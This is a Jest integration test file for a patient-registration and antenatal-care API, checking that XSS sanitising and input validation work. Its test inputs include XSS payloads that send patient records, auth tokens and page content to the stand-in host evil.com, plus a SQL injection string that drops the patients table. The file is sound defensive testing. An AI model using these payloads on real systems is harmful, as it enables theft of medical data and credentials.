// End-to-end integration tests for security validation layer
import request from 'supertest';
import express from 'express';
import { xssClean } from '../server/utils/xssClean';
import { validate } from '../server/validation/middleware';
import { patientSchema, ancRecordSchema } from '../server/validation/patient';

// Mock database and authentication
const mockStorage = {
  createPatient: jest.fn().mockResolvedValue({ id: 1, firstName: 'Test', surname: 'Patient' }),
  getPatientByNrc: jest.fn().mockResolvedValue(null),
  getPatientByPhoneNumber: jest.fn().mockResolvedValue(null)
};

const mockAuth = (req: any, res: any, next: any) => {
  req.isAuthenticated = () => true;
  req.user = { id: 1, username: 'testuser' };
  next();
};

// Create comprehensive test app
const createIntegrationApp = () => {
  const app = express();
  app.use(express.json());
  app.use(mockAuth);
  
  // Patient registration endpoint with full security stack
  app.post('/api/patients', 
    xssClean(), 
    validate(patientSchema), 
    async (req, res) => {
      try {
        // Simulate duplicate checks
        if (req.body.nrc) {
          const existingByNrc = await mockStorage.getPatientByNrc(req.body.nrc);
          if (existingByNrc) {
            return res.status(409).json({ message: 'Patient with this NRC already exists' });
          }
        }
        
        if (req.body.cellphoneNumber) {
          const existingByPhone = await mockStorage.getPatientByPhoneNumber(req.body.cellphoneNumber);
          if (existingByPhone) {
            return res.status(409).json({ message: 'Patient with this phone number already exists' });
          }
        }
        
        const patient = await mockStorage.createPatient(req.body);
        res.status(201).json({ patient, message: 'Patient created successfully' });
      } catch (error) {
        res.status(500).json({ message: 'Internal server error' });
      }
    }
  );
  
  // ANC record creation endpoint with full security stack
  app.post('/api/patients/:id/anc/initial', 
    xssClean(), 
    validate(ancRecordSchema), 
    async (req, res) => {
      try {
        const ancRecord = {
          id: 1,
          patientId: parseInt(req.params.id),
          ...req.body,
          createdAt: new Date()
        };
        res.status(201).json({ ancRecord, message: 'ANC initial visit recorded successfully' });
      } catch (error) {
        res.status(500).json({ message: 'Internal server error' });
      }
    }
  );
  
  return app;
};

describe('End-to-End Security Integration Tests', () => {
  let app: express.Application;
  
  beforeEach(() => {
    app = createIntegrationApp();
    jest.clearAllMocks();
  });

  describe('Complete Patient Registration Flow', () => {
    test('should successfully register patient with valid data and XSS protection', async () => {
      const validPatient = {
        firstName: 'Maria',
        surname: 'Banda',
        dateOfBirth: '1985-03-15',
        sex: 'Female',
        nrc: '850315/15/1',
        cellphoneNumber: '0977123456',
        facility: 'Lusaka General Hospital',
        mothersName: 'Grace',
        mothersSurname: 'Mwanza'
      };

      const response = await request(app)
        .post('/api/patients')
        .send(validPatient);

      expect(response.status).toBe(201);
      expect(response.body.patient).toBeDefined();
      expect(response.body.message).toBe('Patient created successfully');
      expect(mockStorage.createPatient).toHaveBeenCalledWith(
        expect.objectContaining({
          firstName: 'Maria',
          surname: 'Banda',
          sex: 'Female'
        })
      );
    });

    test('should sanitize XSS attacks while maintaining validation', async () => {
      const maliciousPatient = {
        firstName: '<script>alert("XSS in first name")</script>Maria',
        surname: '<img src=x onerror=alert("XSS in surname")>Banda',
        dateOfBirth: '1985-03-15',
        sex: 'Female',
        nrc: '850315/15/1', // Valid NRC
        cellphoneNumber: '0977123456',
        facility: '<svg onload=alert("XSS in facility")>Lusaka General Hospital',
        mothersName: 'Grace',
        mothersSurname: '<iframe src="javascript:alert(\'XSS in mother surname\')">Mwanza'
      };

      const response = await request(app)
        .post('/api/patients')
        .send(maliciousPatient);

      expect(response.status).toBe(201);
      
      // Verify XSS content was sanitized
      const createdPatient = mockStorage.createPatient.mock.calls[0][0];
      expect(createdPatient.firstName).not.toContain('<script>');
      expect(createdPatient.firstName).toContain('Maria');
      expect(createdPatient.surname).not.toContain('<img');
      expect(createdPatient.surname).toContain('Banda');
      expect(createdPatient.facility).not.toContain('<svg');
      expect(createdPatient.facility).toContain('Lusaka General Hospital');
      expect(createdPatient.mothersSurname).not.toContain('<iframe');
      expect(createdPatient.mothersSurname).toContain('Mwanza');
    });

    test('should reject invalid data with proper error handling', async () => {
      const invalidPatient = {
        firstName: 'John',
        surname: 'Doe',
        dateOfBirth: '1990-01-01',
        sex: 'Male',
        nrc: '12345/12/1', // Invalid NRC format
        cellphoneNumber: '123456789', // Invalid phone format
        facility: 'Test Facility',
        mothersName: 'Mary',
        mothersSurname: 'Doe'
      };

      const response = await request(app)
        .post('/api/patients')
        .send(invalidPatient);

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Validation failed');
      expect(response.body.details).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            path: expect.arrayContaining(['nrc'])
          }),
          expect.objectContaining({
            path: expect.arrayContaining(['cellphoneNumber'])
          })
        ])
      );
    });

    test('should handle complex healthcare-specific XSS attacks', async () => {
      const healthcareXSSAttack = {
        firstName: '<script>fetch("/api/patients").then(r=>r.json()).then(d=>fetch("http://evil.com",{method:"POST",body:JSON.stringify(d)}))</script>Patient',
        surname: '<img src=x onerror=navigator.sendBeacon("http://evil.com/exfiltrate",localStorage.getItem("authToken"))>Name',
        dateOfBirth: '1990-01-01',
        sex: 'Female',
        nrc: '900101/15/1',
        cellphoneNumber: '0977654321',
        facility: '<style>body{background:url("http://evil.com/track?facility="+encodeURIComponent(location.href))}</style>Hospital',
        mothersName: '<svg onload=document.cookie="malicious=true;domain=.replit.dev">Mother',
        mothersSurname: '<meta http-equiv="refresh" content="0;url=http://evil.com/phishing">Surname',
        emergencyContact: '<object data="javascript:alert(\'Emergency XSS\')"></object>0977111222'
      };

      const response = await request(app)
        .post('/api/patients')
        .send(healthcareXSSAttack);

      expect(response.status).toBe(201);
      
      const sanitizedData = mockStorage.createPatient.mock.calls[0][0];
      expect(sanitizedData.firstName).not.toContain('<script>');
      expect(sanitizedData.firstName).not.toContain('fetch');
      expect(sanitizedData.firstName).toContain('Patient');
      
      expect(sanitizedData.surname).not.toContain('<img');
      expect(sanitizedData.surname).not.toContain('onerror');
      expect(sanitizedData.surname).toContain('Name');
      
      expect(sanitizedData.facility).not.toContain('<style>');
      expect(sanitizedData.facility).toContain('Hospital');
      
      expect(sanitizedData.mothersName).not.toContain('<svg');
      expect(sanitizedData.mothersName).toContain('Mother');
      
      expect(sanitizedData.mothersSurname).not.toContain('<meta');
      expect(sanitizedData.mothersSurname).toContain('Surname');
    });
  });

  describe('ANC Record Creation Flow', () => {
    test('should successfully create ANC record with clinical data protection', async () => {
      const validANCRecord = {
        patientId: 1,
        visitType: 'initial',
        gestationalAge: 12,
        bloodPressureSystolic1: 120,
        bloodPressureDiastolic1: 80,
        temperatureFirst: 370,
        pulseRateFirst: 72,
        respiratoryRateFirst: 18
      };

      const response = await request(app)
        .post('/api/patients/1/anc/initial')
        .send(validANCRecord);

      expect(response.status).toBe(201);
      expect(response.body.ancRecord).toBeDefined();
      expect(response.body.ancRecord.gestationalAge).toBe(12);
      expect(response.body.message).toBe('ANC initial visit recorded successfully');
    });

    test('should sanitize clinical notes and medical data from XSS', async () => {
      const maliciousANCRecord = {
        patientId: 1,
        visitType: 'initial',
        gestationalAge: 16,
        bloodPressureSystolic1: 115,
        bloodPressureDiastolic1: 75,
        clinicalNotes: '<script>document.location="http://evil.com/steal-medical-data?data="+btoa(JSON.stringify(window.medicalData))</script>Patient appears healthy',
        symptoms: '<img src=x onerror=fetch("http://evil.com/log-symptoms",{method:"POST",body:document.body.innerHTML})>Mild nausea',
        medications: '<svg onload=alert("Access to medication data")>Folic acid prescribed',
        medicalHistory: '<iframe src="javascript:fetch(\'/api/patients\').then(r=>r.text()).then(d=>fetch(\'http://evil.com/exfiltrate\',{method:\'POST\',body:d}))"></iframe>No significant history',
        allergies: '<object data="data:text/html,<script>alert(document.cookie)</script>">None known</object>'
      };

      const response = await request(app)
        .post('/api/patients/1/anc/initial')
        .send(maliciousANCRecord);

      expect(response.status).toBe(201);
      
      const createdRecord = response.body.ancRecord;
      expect(createdRecord.clinicalNotes).not.toContain('<script>');
      expect(createdRecord.clinicalNotes).toContain('Patient appears healthy');
      
      expect(createdRecord.symptoms).not.toContain('<img');
      expect(createdRecord.symptoms).not.toContain('onerror');
      expect(createdRecord.symptoms).toContain('Mild nausea');
      
      expect(createdRecord.medications).not.toContain('<svg');
      expect(createdRecord.medications).toContain('Folic acid prescribed');
      
      expect(createdRecord.medicalHistory).not.toContain('<iframe');
      expect(createdRecord.medicalHistory).toContain('No significant history');
      
      expect(createdRecord.allergies).not.toContain('<object');
      expect(createdRecord.allergies).toContain('None known');
    });

    test('should validate clinical ranges and reject dangerous values', async () => {
      const dangerousANCRecord = {
        patientId: 1,
        visitType: 'routine',
        gestationalAge: 55, // Too high
        bloodPressureSystolic1: 300, // Dangerously high
        bloodPressureDiastolic1: 200, // Dangerously high
        temperatureFirst: 450, // Impossible temperature
        pulseRateFirst: 250 // Dangerously high
      };

      const response = await request(app)
        .post('/api/patients/1/anc/initial')
        .send(dangerousANCRecord);

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('Validation failed');
      expect(response.body.details.length).toBeGreaterThan(0);
    });
  });

  describe('SQL Injection Protection', () => {
    test('should handle SQL injection attempts in patient data', async () => {
      const sqlInjectionAttempt = {
        firstName: "Robert'; DROP TABLE patients; SELECT * FROM users WHERE '1'='1",
        surname: "Johnson",
        dateOfBirth: '1985-01-01',
        sex: 'Male',
        nrc: '850101/12/1',
        facility: 'Hospital',
        mothersName: "Mary",
        mothersSurname: "Johnson"
      };

      const response = await request(app)
        .post('/api/patients')
        .send(sqlInjectionAttempt);

      expect(response.status).toBe(201);
      
      const sanitizedData = mockStorage.createPatient.mock.calls[0][0];
      expect(sanitizedData.firstName).toContain('Robert');
      expect(sanitizedData.firstName).not.toContain('DROP TABLE');
      expect(sanitizedData.firstName).not.toContain('SELECT *');
    });
  });

  describe('Data Integrity Validation', () => {
    test('should maintain data consistency through security layers', async () => {
      const patientData = {
        firstName: 'Integrity',
        surname: 'Test',
        dateOfBirth: '1990-05-20',
        sex: 'Female',
        nrc: '900520/15/1',
        cellphoneNumber: '0977555666',
        facility: 'Data Integrity Hospital',
        mothersName: 'Consistent',
        mothersSurname: 'Mother'
      };

      const response = await request(app)
        .post('/api/patients')
        .send(patientData);

      expect(response.status).toBe(201);
      
      const storedData = mockStorage.createPatient.mock.calls[0][0];
      
      // Verify all required fields are preserved
      expect(storedData.firstName).toBe('Integrity');
      expect(storedData.surname).toBe('Test');
      expect(storedData.sex).toBe('Female');
      expect(storedData.nrc).toBe('900520/15/1');
      expect(storedData.cellphoneNumber).toBe('0977555666');
      
      // Verify data types are maintained
      expect(typeof storedData.firstName).toBe('string');
      expect(typeof storedData.sex).toBe('string');
      expect(typeof storedData.nrc).toBe('string');
    });
  });
});